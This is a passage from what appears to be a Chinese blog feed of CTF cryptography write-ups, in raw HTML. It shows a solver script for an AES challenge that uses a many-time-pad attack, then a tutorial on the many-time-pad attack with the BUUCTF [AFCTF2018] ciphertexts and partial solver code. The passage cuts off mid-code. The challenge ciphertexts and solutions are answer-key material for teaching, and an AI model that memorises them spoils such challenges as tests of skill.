AXDNj1/f2eRFbIU2GN6Wfj89fEINJjoG/1O/I5Q8S7tHnlWFQNoXJQ2e4r2Aca9RPLVCWz7Nq96YUKBRN3afW/9FSwWLLvjsBptQmoRj4FwmJzJf7Vj6KCOkm6mdaZ4l6FB4/E2Lk9aopD7Q473leULPM1CydXWme/8WKUqEucDwraXS57+Z+iGRMvQ8MABtZboAVFK2B1mzNL4Ba/bxVE4puy4HwvQI+N1tKmeMf99FfR13IA0y+FWL3eCzXKw8gimaJCW1e3QJJWDorDXRRjExeokMGGHzOd8MrTfNNFGWSPqZRTdGJxW7wOWQi3bHT0WSqP1fBpdU9m+WKHIxy57dL/8JFJJ97R56P76rlToRrM825JcTBEfrK0Nb9Q+2RI83vyTA2UxH9s9cSnWd+e7nacrfXjV7EjkGHgblEGHX9LqNETaZpBAL0NG9OAJ0+f+6id4/Ixcee0jx4b8k5xvblujFEdK0q2MRo2uTxSAFMpelt8JY0EZbnF9uT88N4LPms3cNeKBt0KBhx+vshFKMc/b3W7OMCo6m7EyzmcTmMe+Y6CO0x0FF0p6h1bTnJu3MMok1hO27iBSfYusHgKWVmKpgNHjiDfuBYnuBCysa+hHQZW23zxNRqi2OGAy6zCGPOY4E4nyUA6g/jlVOjq6fFv1VHN1tlQlBOCvB9r5B0os1zI2XL/Mlb9eggNuA8nw2igDm+9qkBtLxOXojAGDonAPzBagHXnVd+0kLdUGEoddt45A2fgSSociCx4tVDMd5ag1zR4VxdADAy0lnmW0n8noAT5y60SV7gICvMOphILBRjk365Mu6GNA3C+n8k5YH9sRnS7Z5EVEKdSeYigJs4XNavD50/paKnJcux2l3gzm/1aTUMzLd8tw7vZuUWv1XaYULcez8ieEMeACETyN53+RlcPQefupgszELvwlKz0prl5ydHCPOA7+ZS2zfUZOEmRSBNaIZUCd5euNg+HXMeFa/Qb452+KKEjq7vRthC4hH9gluaYMl/eXboQvvVu4xDhfVW403enI7sxdMR3t2WO1cOaLE8IN5c71W+IqhaRbJ/Prlo/pk/XAtMvimZxIN4y5/oP5vQ/lCt5jM9wAtPKSoQbJxWIYWNrXVfkZUOOwD2tlOmyxMCcKFr8921JHgtWqcYliElNX19hzmYhow+19EV3zhITzsGOX/PP1BHIKz/NJyKcGqx1hlfrDfDVedhJWkQL9sg4clbfguprs3KG5YNbbjclaK9JoEboBY3EGBGHtsWfmIRAREwy1a53y/a/NUDLaQxrMsyV/YnbiyBevGjMVNnqIY5T0YtPLL/s5Wvmq7EU9qoMDIlaosCf616TagcZalGFQumL15q6wx3FxwVB5EAjFa/MKnZNc0CqbFhXgEevp1ZXRnjEAdSK99gyAmwVawWpxIWXZQvQ5w7tIQ+nF8utoG4ab/AdLbZyKCtT8pxjiHifNcCCkLfew8Qq9S2JnrhCUMs9SEiRrLZHiE9JVlwbUJzAQjCM6G4tdeLNEApqDv4eZ7zh2U9K2+Gk9OjBgSk5xMjRkCzKCrNAKgRLoJ1Gu8L4T9LSBp1juhUsyaIaK&#x27;  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>这段代码实现了一个基于AES加密的自定义加密方案，结合了ECB模式和CBC模式的某些特性，明文按16字节分组进行加密，打印出key和密文，iv(偏移量)未知，需要还原明文。可以发现本题是多次使用同样的流密码。<br>所以本题其实是利用利用<a href="https://so.csdn.net/so/search?q=MTP&spm=1001.2101.3001.7020">MTP</a>攻击来求解，比较好的两篇文章可以参考<br>[参考一](<a href="https://www.ruanx.net/many-time-pad/">Many-Time-Pad 攻击</a>)<br><a href="%5BMTP%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90-CSDN%E5%8D%9A%E5%AE%A2%5D(https://blog.csdn.net/m0_63303407/article/details/127193042)">参考二</a></p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python3  </span></span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor <span class="keyword">as</span> xor  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo  </span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span>  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span>  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):  </span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:  </span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)  </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):  </span><br><span class="line">        <span class="keyword">if</span> x != index:  </span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):  </span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)  </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):  </span><br><span class="line">        <span class="keyword">if</span> x != index:  </span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():  </span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):  </span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x != y]  </span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))  </span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]  </span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):  </span><br><span class="line">            dat.append((f(pos), index, pos))  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">key = <span class="string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;</span>  </span><br><span class="line">key = base64.b64decode(key)  </span><br><span class="line">c = <span class="string">b&#x27;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&#x27;</span>  </span><br><span class="line">c = base64.b64decode(c)  </span><br><span class="line">cipher = AES.new(key, mode=AES.MODE_ECB)  </span><br><span class="line">t = []  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(c), <span class="number">16</span>):  </span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:  </span><br><span class="line">        t.append(cipher.decrypt(c[i:i + <span class="number">16</span>]))  <span class="comment"># s1 ^ iv  </span></span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        t.append(xor(cipher.decrypt(c[i:i + <span class="number">16</span>]), c[i - <span class="number">16</span>:i]))  </span><br><span class="line">tmp = []  </span><br><span class="line">tmp.append(t[<span class="number">0</span>])  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(t)):  </span><br><span class="line">    tttt = t[i]  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, i):  </span><br><span class="line">        tttt = xor(tttt, t[j])  </span><br><span class="line">    tmp.append(tttt)  <span class="comment"># si ^ iv  </span></span><br><span class="line"><span class="comment"># MTP attack  </span></span><br><span class="line">c = tmp  </span><br><span class="line">dat = []  </span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)  </span><br><span class="line">getSpace()  </span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]  </span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:  </span><br><span class="line">    infer(index, pos)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Many Time Pad Attack</title>
      <link href="/2025/06/22/Many-Time-Pad-Attack/"/>
      <url>/2025/06/22/Many-Time-Pad-Attack/</url>
      
        <content type="html"><![CDATA[<h2 id="一些基础知识"><a href="#一些基础知识" class="headerlink" title="一些基础知识"></a>一些基础知识</h2><p><strong>符号：</strong></p><p>⊕ 代表异或</p><p>C1 代表密文</p><p>M1 代表明文</p><p><strong>性质：</strong></p><ol><li>交换律</li><li>结合律 (a ⊕ b ) ⊕ c &#x3D; a⊕ ( b ⊕ c)</li><li>任何数x x ⊕ x &#x3D; 0 x ⊕ 0 &#x3D; X</li><li>自反性 x ⊕ b ⊕ b &#x3D; x ⊕ 0 &#x3D; x</li></ol><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Many-Time-Pad (多时间垫) 攻击是一种针对多次使用相同密钥的流密码（如一次性密码本，One-Time Pad）的密码分析技术。其核心原理是利用密钥重用导致的明文信息泄露，通过数学和统计方法恢复部分或全部明文。以下是其核心原理和步骤：</p><p><strong>1. 一次性密码本（OTP）的安全前提</strong><br>OTP的安全性是建立在：</p><ul><li>密钥完全随机且仅使用一次。</li><li>密钥长度 ≥ 明文长度。</li><li>若同一密钥被多次加密不同明文（即 C₁ &#x3D; P₁ ⊕ K, C₂ &#x3D; P₂ ⊕ K），则攻击者可通过密文的组合推断出明文信息。</li></ul><p><strong>2. 攻击原理：密钥重用的漏洞</strong><br>当同一密钥 K 加密多个明文时，密文之间的异或（⊕）等价于明文之间的异或：</p><p>$C₁ ⊕ C₂ &#x3D; (P₁ ⊕ K) ⊕ (P₂ ⊕ K) &#x3D; P₁ ⊕ P₂$<br>形象一点可以表达成这样：</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">密文 <span class="operator">=</span> 明文 ⊕ 密钥</span><br><span class="line">密文<span class="number">1</span> ⊕ 密文<span class="number">2</span> <span class="operator">=</span> 明文<span class="number">1</span> ⊕ 明文<span class="number">2</span> ⊕ 密钥<span class="number">1</span> ⊕ 密钥<span class="number">2</span></span><br></pre></td></tr></table></figure><p>此时，攻击者获得了 P₁ ⊕ P₂（即明文的异或结果），而无需知道密钥 K。</p><p><strong>3. 利用明文冗余恢复信息</strong><br>通过分析 P₁ ⊕ P₂，攻击者可以利用自然语言的统计特性（如字母频率、空格、常见词）逐步推测明文。例如：</p><ul><li><p>空格字符攻击：在ASCII编码中，空格（0x20）与字母异或的结果具有特定模式（如大写&#x2F;小写转换）。</p></li><li><p>词频分析：对 P₁ ⊕ P₂ 的局部进行猜测，若某段异或结果符合常见词的统计特征（如英文中的”the”、”and”），则可反推明文片段。</p></li></ul><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h3 id="BUUCTF-AFCTF2018"><a href="#BUUCTF-AFCTF2018" class="headerlink" title="BUUCTF: [AFCTF2018]"></a>BUUCTF: [AFCTF2018]</h3><figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"><span class="number">25030206463d</span>3d393131555f7f1d061d4052111a195<span class="number">44e2e5d54</span></span><br><span class="line"><span class="number">0</span>f020606150f203f307f5c0a7f24070747130e165<span class="number">45000035d54</span></span><br><span class="line"><span class="number">1203075429152</span>a7020365c167f390f1013170b1006481e13144e</span><br><span class="line"><span class="number">0</span>f4610170e1e2235787f7853372c0f065752111b154<span class="number">54e0e0901</span></span><br><span class="line"><span class="number">081543000</span>e1e6f3f3a3348533a270d064a02111a1b5f<span class="number">4e0a1855</span></span><br><span class="line"><span class="number">0909075412132</span>e247436425332281a1c561f04071d5<span class="number">20f0b1158</span></span><br><span class="line"><span class="number">4116111</span>b101e2170203011113a69001b4752060<span class="number">1155205021901</span></span><br><span class="line"><span class="number">041006064612297020375453342</span>c17545a014518114<span class="number">11a470e44</span></span><br><span class="line"><span class="number">021311114</span>a5b0335207f7c167f22001b44520c15<span class="number">544801125d40</span></span><br><span class="line"><span class="number">06140611460</span>c26243c7f5c167f3d015446010053<span class="number">005907145d44</span></span><br><span class="line"><span class="number">0</span>f05110d160f263f3a7f4210372c03111313090415481d49530f</span><br></pre></td></tr></table></figure><p>设每一个字符串（密文）为$C_i$,都是某个<code>key</code>异或上明文 $M_i$ 得到的.我们的目标是获取到这个key,已知明文是英文句子.</p><p>$C_1 ⨁ C_2 &#x3D;(M_1 ⨁ key) ⨁ (M_2 ⨁ key) &#x3D; M_1 ⨁ M_2$</p><p>因此两个密文异或得到两个明文</p><p>我们使用$C_1$异或上其他的密文</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">loca = string.ascii_lowercase + string.ascii_uppercase</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hextostr</span>(<span class="params">hexstr</span>):</span><br><span class="line">    <span class="built_in">hex</span> = hexstr.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    str_bin = binascii.unhexlify(<span class="built_in">hex</span>)</span><br><span class="line">    <span class="keyword">return</span> str_bin.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">c1 = <span class="string">&quot;25030206463d3d393131555f7f1d061d4052111a19544e2e5d&quot;</span></span><br><span class="line">c2 = <span class="string">&#x27;0f020606150f203f307f5c0a7f24070747130e16545000035d&#x27;</span></span><br><span class="line">c3 = <span class="string">&#x27;1203075429152a7020365c167f390f1013170b1006481e1314&#x27;</span></span><br><span class="line">c4 = <span class="string">&#x27;0f4610170e1e2235787f7853372c0f065752111b15454e0e09&#x27;</span></span><br><span class="line">c5 = <span class="string">&#x27;081543000e1e6f3f3a3348533a270d064a02111a1b5f4e0a18&#x27;</span></span><br><span class="line">c6 = <span class="string">&#x27;0909075412132e247436425332281a1c561f04071d520f0b11&#x27;</span></span><br><span class="line">c7 = <span class="string">&#x27;4116111b101e2170203011113a69001b475206011552050219&#x27;</span></span><br><span class="line">c8 = <span class="string">&#x27;041006064612297020375453342c17545a01451811411a470e&#x27;</span></span><br><span class="line">c9 = <span class="string">&#x27;021311114a5b0335207f7c167f22001b44520c15544801125d&#x27;</span></span><br><span class="line">c10 = <span class="string">&#x27;06140611460c26243c7f5c167f3d015446010053005907145d&#x27;</span></span><br><span class="line">c11 = <span class="string">&#x27;0f05110d160f263f3a7f4210372c03111313090415481d49&#x27;</span></span><br><span class="line">chiphers =[c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]</span><br><span class="line"></span><br><span class="line">s2 = hextostr(c2)</span><br><span class="line">sc1 = hextostr(c1)</span><br><span class="line"><span class="keyword">for</span> chipher <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chiphers)):</span><br><span class="line">    <span class="keyword">if</span> chipher == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sc1)):</span><br><span class="line">        asc =<span class="built_in">chr</span>(<span class="built_in">ord</span>(sc1[i]) ^ <span class="built_in">ord</span>(hextostr(chiphers[chipher])[i]))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> asc:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> loca:</span><br><span class="line">                <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;.&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><p>得到的内容如下：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">...<span class="selector-class">.S</span>...<span class="selector-class">.N</span><span class="selector-class">.U</span>....<span class="selector-class">.A</span>.<span class="selector-class">.M</span><span class="selector-class">.N</span>..</span><br><span class="line">..<span class="selector-class">.Ro</span>.<span class="selector-class">.I</span>..<span class="selector-class">.I</span>...<span class="selector-class">.SE</span>...<span class="selector-class">.P</span><span class="selector-class">.I</span></span><br><span class="line"><span class="selector-class">.E</span>.<span class="selector-class">.H</span>..<span class="selector-class">.IN</span>.<span class="selector-class">.H</span>..........<span class="selector-class">.T</span></span><br><span class="line">.<span class="selector-class">.A</span><span class="selector-class">.H</span><span class="selector-class">.R</span>....<span class="selector-class">.E</span>...<span class="selector-class">.P</span>.....<span class="selector-class">.E</span></span><br><span class="line">..<span class="selector-class">.RT</span>..<span class="selector-class">.E</span>..<span class="selector-class">.M</span>...<span class="selector-class">.M</span>...<span class="selector-class">.A</span><span class="selector-class">.L</span></span><br><span class="line">d..<span class="selector-class">.V</span>.<span class="selector-class">.I</span>.<span class="selector-class">.DNEt</span>.......<span class="selector-class">.K</span><span class="selector-class">.D</span></span><br><span class="line">......<span class="selector-class">.I</span>...<span class="selector-class">.K</span>.<span class="selector-class">.I</span><span class="selector-class">.ST</span>..<span class="selector-class">.TiS</span></span><br><span class="line">....<span class="selector-class">.f</span>..<span class="selector-class">.N</span><span class="selector-class">.I</span>.......<span class="selector-class">.M</span><span class="selector-class">.O</span>..</span><br><span class="line">........<span class="selector-class">.N</span><span class="selector-class">.I</span>..<span class="selector-class">.I</span><span class="selector-class">.S</span><span class="selector-class">.I</span>.<span class="selector-class">.I</span>..</span><br><span class="line">...<span class="selector-class">.P</span>...<span class="selector-class">.N</span><span class="selector-class">.OH</span>..<span class="selector-class">.SA</span>...<span class="selector-class">.Sg</span>..</span><br></pre></td></tr></table></figure><p>可以观察到，有些列上有大量的英文字符，有些列一个英文字符都没有。这是偶然现象吗？</p><h3 id="ascii表"><a href="#ascii表" class="headerlink" title="ascii表"></a>ascii表</h3><p>ascii 码表在 Linux 下可以通过 man ascii 指令查看。它的性质有：</p><ul><li>0x20 是空格。 低于 0x20 的，全部是起特殊用途的字符； 0x20~0x7E 的，是可打印字符。</li><li>0x30~0x39 是数字 0,1,2…9。</li><li>0x41<del>0x5A 是大写字母 A-Z； 0x61</del>0x7A 是小写字母 a-z.</li></ul><p>我们可以注意到一个至关重要的规律：小写字母 xor 空格，会得到对应的大写字母；大写字母 xor 空格，会得到小写字母！所以，如果 <code>x ⨁ y</code> 得到一个英文字母，那么x和y之中有一个很大概率可能是空格，那么来看 C1 ⊕ 其他密文也就是M1 ⊕ 其他明文的表，如果第<code>col</code>列存在大量英文字母,我们可以猜测 <code>M1[col]</code> 是一个空格 知道M1的col位是空格有什么用呢？别忘了异或运算下，<code>x</code>的逆元是其自身。所以</p><p><strong>$M_i[col] &#x3D; M_1[col] ⨁ M_i[col] &#x3D; M_1[col] ⨁ M_i[col] ⨁ 0x20$</strong></p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):</span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = 